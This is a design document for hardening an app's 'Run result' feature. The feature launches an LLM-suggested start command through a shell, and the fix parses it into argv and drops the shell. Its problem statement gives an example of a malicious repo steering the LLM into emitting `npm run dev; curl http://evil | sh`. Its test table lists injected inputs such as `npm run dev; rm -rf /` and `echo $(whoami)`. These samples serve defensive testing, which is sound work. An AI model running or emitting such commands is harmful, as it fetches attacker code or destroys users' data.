# Run-result launch hardening — design (fix cycle S2)

**Date:** 2026-06-27
**Source:** Audit `docs/audits/2026-06-27-tool-audit.md`, Critical finding #1; triage cycle **S2** in
`docs/audits/2026-06-27-remediation-cycles.md`.
**Status:** approved design, ready for implementation plan.

## Problem

The "Run result" feature launches the app the agents built. Today the launch command reaches a shell:

```
manifest-detector.ts (LLM emits free-form startCommand)
  → run-manifest.ts:38 parseManifest (validated only with .trim())
  → RunResultModal.tsx (editable text field; users click through)
  → ipc launchServer
  → server-manager.ts:36-41  spawn(input.startCommand, { shell:true, detached:true, cwd, env })
```

`shell:true` runs the string through `/bin/sh -c`, so any `;`, `&&`, `|`, `$()`, or backtick executes.
The `startCommand` is derived from attacker-controllable inputs (the goal, repo filenames, `package.json`
scripts, the prior run report fed into `detectManifestPrompt`), so a malicious target repo can steer the
detector into emitting e.g. `npm run dev; curl http://evil | sh`. The editable field is a weak control
(users click "Launch"), and the process inherits the full environment.

## Goal

The launch command is **never interpreted by a shell**. Legitimate detector outputs
(`npm run dev`, `vite --port 5173`, `python3 -m http.server 8000`) launch exactly as before; anything that
needs a shell is **refused with a clear message** rather than executed or silently mangled.

Non-goals (explicit YAGNI, per brainstorm decisions): no shell escape hatch, no launcher allow-list, no
env-var-prefix support. IPC contract unchanged. Windows support out of scope (app targets macOS/POSIX).

## Core mechanism

Stop using a shell. Parse the command string into `argv` ourselves and
`spawn(command, args, { shell:false, … })`.

**Why this is the fix:** with `shell:false` there is no shell to interpret metacharacters — the tokens are
passed to the binary literally, so injection is structurally impossible regardless of the input. The
metacharacter **rejection** below is therefore not the security mechanism; it is a *loud-failure* guard so a
shell-dependent command (`a && b`) fails with a clear message instead of being passed to the binary as
nonsense arguments (`['a','&&','b']`).

## Components

### §1 — `src/shared/run-manifest.ts`: new pure `parseStartCommand(raw)`

The security-relevant, fully unit-tested unit. No node/DOM imports (stays plain-Node testable, consistent
with the file's existing role).

```ts
export type ParsedCommand =
  | { ok: true; command: string; args: string[] }
  | { ok: false; error: string }

export function parseStartCommand(raw: string): ParsedCommand
```

**Tokenizer grammar** (single left-to-right walk):
- Whitespace **outside quotes** separates tokens; runs of whitespace collapse; leading/trailing trimmed.
- `'` opens a single-quoted span that ends at the next `'`; `"` opens a double-quoted span that ends at the
  next `"`. Inside a quoted span every character (including operators and spaces) is **literal**. Quote
  characters are removed from the resulting token. A quote may sit mid-token (`node "my server.js"` →
  one token `my server.js`).
- Backslash is treated as a literal character (no escape processing — launch commands don't need it). Documented.
- An unterminated quote at end of input → `{ ok:false, error:'Unbalanced quote in command.' }`.
- `command` = token[0]; `args` = the rest.

**Rejection rules** (checked during the walk, on **unquoted** characters only, so operators inside quotes
stay literal data):
- Any unquoted occurrence of a shell operator `;  &  |  $  ` + "`" + `  (  )  <  >`, carriage return, or
  newline → `{ ok:false, error:'Remove shell characters (; & | $ \` ( ) < >). The launcher runs without a
  shell.' }`.
- A leading `command` token matching `^[A-Za-z_][A-Za-z0-9_]*=` (env assignment, e.g. `PORT=3000`) →
  `{ ok:false, error:'Set environment via the app, not an inline VAR=value prefix; put the port in the Port field.' }`.
- Empty / whitespace-only input → `{ ok:false, error:'Enter a start command.' }`.

**Deliberately allowed (literal, safe under `shell:false`):** glob/brace characters `* ? [ ] { } ~` pass
through to the binary literally (no expansion without a shell). Documented; not rejected.

`parseManifest` is **unchanged** — `startCommand` stays a display string in the `RunManifest`; validation
happens at launch time so the user always sees the raw suggestion and can edit it.

### §2 — `src/main/engine/server-manager.ts`: `launchServer` (authoritative trust boundary)

```ts
const serverId = randomUUID()
const projectPath = getCurrentProjectPath()
const parsed = parseStartCommand(input.startCommand)
if (!parsed.ok) {
  sendStatus(wc, serverId, 'error')
  if (!wc.isDestroyed()) wc.send(IPC.serverLog, { serverId, data: `[cannot launch] ${parsed.error}\n` })
  return { serverId }                     // nothing spawned, `active` not set
}
const proc = spawn(parsed.command, parsed.args, {
  shell: false, detached: true, cwd: projectPath, env: cleanEnv()
})
```

Everything else is unchanged: `detached:true` still creates the process group, so the negative-pid
group-kill in `stopActive()` still works without a shell; the port poll, `proc.on('error'|'exit')`, and
status streaming are untouched. **IPC signature unchanged** (`{ startCommand, port, path }`) → minimal
blast radius. This main-process check is the real boundary (the renderer can be bypassed).

### §3 — `src/renderer/run/RunResultModal.tsx`: live UX guard (convenience, not a boundary)

- Compute `const parsed = parseStartCommand(cmd)` from the same shared function (imported from
  `../../shared/run-manifest`).
- When `cmd` is non-empty and `!parsed.ok`, render `parsed.error` as an inline error under the Start-command
  field (don't nag on empty input).
- Disable "Launch & open" when `!parsed.ok || launching` (replaces the current `!cmd.trim() || launching`,
  which `parseStartCommand` subsumes — empty → `ok:false`).
- No new fields; the field stays editable. Both layers call the one shared validator, so they cannot drift.

## Data flow (after)

```
detector → parseManifest (unchanged; startCommand = display string)
  → modal shows editable suggestion
  → renderer parseStartCommand → disable Launch + inline error if invalid
  → on Launch: main parseStartCommand (authoritative) → spawn(shell:false) | refuse + error status/log
```

## Error handling

- Invalid command never spawns; the reason is surfaced both inline (renderer) and via the existing
  `serverLog`/`serverStatus 'error'` channel (main).
- Specific messages for shell-operator, env-prefix, unbalanced-quote, and empty cases.
- A valid-but-nonexistent binary (`ENOENT`) is still handled by the existing `proc.on('error')` →
  `serverStatus 'error'` + `[spawn error]` log.

## Testing (TDD)

New `describe('parseStartCommand')` block in `src/shared/run-manifest.test.ts`:

| Input | Expected |
|---|---|
| `npm run dev` | `{ok:true, command:'npm', args:['run','dev']}` |
| `vite --port 5173` | `args:['--port','5173']` |
| `python3 -m http.server 8000` | `command:'python3', args:['-m','http.server','8000']` |
| `node "my server.js"` | `command:'node', args:['my server.js']` |
| `node 'my server.js'` | `command:'node', args:['my server.js']` |
| `  npm   run  dev ` | whitespace collapses → `['run','dev']` |
| `node "a;b.js"` | `ok:true, args:['a;b.js']` (operator inside quotes is literal) |
| `` (empty) / `   ` | `ok:false`, "Enter a start command." |
| `npm run dev; rm -rf /` | `ok:false` (`;`) |
| `a && b` | `ok:false` (`&`) |
| `a \| b` | `ok:false` (`\|`) |
| `echo $(whoami)` | `ok:false` (`$`/`(`) |
| `` echo `whoami` `` | `ok:false` (backtick) |
| `a > b` / `a < b` | `ok:false` (redirection) |
| `PORT=3000 npm start` | `ok:false` (leading env assignment) |
| `node "server.js` | `ok:false`, "Unbalanced quote…" |
| `a\nb` (newline) | `ok:false` |

Existing `parseManifest` tests stay green (no contract change). `server-manager.ts` remains untested per its
own header — all security logic lives in the tested shared function and `shell:false` is a constant.
**Optional (note for the plan, default out of scope):** add a spawn-injection regression test by threading a
`spawn` seam into `launchServer`; include only if the plan deems it cheap.

## "Off = byte-for-byte"?

N/A — this is a security fix that intentionally changes behavior (shell-dependent commands are now refused).
Every legitimate detector output runs identically through `argv`.

## Files touched

- `src/shared/run-manifest.ts` — add `parseStartCommand` + `ParsedCommand` type.
- `src/shared/run-manifest.test.ts` — new test block.
- `src/main/engine/server-manager.ts` — call the validator; `spawn(command, args, {shell:false,…})`.
- `src/renderer/run/RunResultModal.tsx` — inline error + Launch-disable via the shared validator.
